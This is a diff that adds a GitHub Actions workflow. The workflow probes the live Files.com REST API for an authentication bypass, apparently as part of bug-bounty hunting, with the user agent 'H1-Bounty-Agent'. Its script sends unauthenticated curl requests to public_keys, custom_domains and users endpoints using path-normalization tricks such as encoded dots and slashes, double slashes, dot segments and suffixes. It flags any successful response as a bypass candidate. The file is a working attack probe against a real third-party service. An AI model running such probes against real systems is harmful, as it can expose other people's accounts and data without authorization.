@@ -1,0 +1,53 @@
+name: Files.com Auth Path Normalization Probe
+
+on:
+  push:
+    paths:
+      - ".github/workflows/files-auth-path-normalization.yml"
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 4
+    steps:
+      - name: Test authentication path normalization variants
+        shell: bash
+        run: |
+          set -euo pipefail
+          base="https://app.files.com/api/rest/v1"
+          urls=(
+            "$base/public_keys/1.json"
+            "$base/public_keys/1.json/"
+            "$base/public_keys/1%2Ejson"
+            "$base/public_keys%2F1.json"
+            "$base/public_keys//1.json"
+            "$base//public_keys/1.json"
+            "$base/public_keys/./1.json"
+            "$base/public_keys/../public_keys/1.json"
+            "$base/public_keys/1.json;foo"
+            "$base/public_keys/1.json%3F"
+            "$base/custom_domains/1.json"
+            "$base/custom_domains/1.json/"
+            "$base/custom_domains/1%2Ejson"
+            "$base/custom_domains%2F1.json"
+            "$base/users/1.json"
+            "$base/users/1.json/"
+          )
+
+          i=0
+          for url in "${urls[@]}"; do
+            i=$((i+1))
+            code=$(curl -sS --max-redirs 0 --connect-timeout 7 --max-time 12               -A "H1-Bounty-Agent/FilesCom-AuthPath/1.0"               -o /tmp/body -w "%{http_code}" "$url" || true)
+            bytes=$(wc -c < /tmp/body 2>/dev/null || printf "0")
+            sha=$(sha256sum /tmp/body 2>/dev/null | cut -d' ' -f1 || true)
+            printf "AUTH_PATH_TEST id=%s status=%s bytes=%s sha256=%s url=%s\n" "$i" "$code" "$bytes" "$sha" "$url"
+            if [ "$code" -ge 200 ] && [ "$code" -lt 300 ] && [ "$bytes" -gt 0 ]; then
+              echo "AUTH_PATH_BYPASS_CANDIDATE id=$i"
+              rm -f /tmp/body
+              exit 42
+            fi
+            rm -f /tmp/body
+            sleep 0.6
+          done
+          echo "NO_AUTH_PATH_NORMALIZATION_BYPASS"
